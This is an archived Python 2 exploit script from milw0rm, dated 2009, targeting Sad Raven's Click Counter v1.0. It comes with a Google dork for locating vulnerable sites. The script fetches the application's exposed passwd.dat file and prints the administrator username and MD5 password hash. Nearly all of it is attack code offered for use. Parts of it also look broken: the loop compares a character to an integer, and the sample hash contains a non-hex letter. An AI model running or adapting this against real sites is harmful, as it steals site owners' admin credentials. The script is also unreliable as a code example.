#!/usr/bin/python
#Portal Name: Sad Raven's Click Counter
#version : 1.0
#'Google Dork : Sad Raven's Click Counter v1.0
#Exploit Coded by: Pouya_Server
#Exploit Discovered by: Pouya_Server
#Contact Me : Pouya.s3rver@Gmail.com

import urllib
import sys
import parser
serv="http://"
i=0
for arg in sys.argv:
     i=i+1
if i!=3:
 print """\n\n
         \tSad Raven's Click Counter v1.0  (passwd.dat)
          \tUsage:exploit.py [targetsite] [path]
          \tExample:exploit.py www.target.com /Path/
\tResult=$Password['Admin']="c71032e32b9ce349f99f655e68d7324g"
     \t       $Password['Admin Username']="Admin Password [MD5]" \n\n"""
else:

    adres=sys.argv[1]
    path=sys.argv[2]
    str1=adres.join([serv,path])
    str2=str1.join(['','/passwd.dat'])
    print "\n[~]Connecting..."
    url=urllib.urlopen(str2).read();
    print "\n[+]Connected!"

    test=url.find(path);
    t=0;
    print "\n\t\t\t-=[Admin Username and Password]=-"
    while(url[test+1]!=1): # Pouya
              print url[test],
              if(url[test]=='\n'):
                 t=t+1;
              if(t==2):
                 break;

              test=test+1;
    print "\n\n\t\t\t[ coded by Pouya_Server ]"

# milw0rm.com [2009-01-21]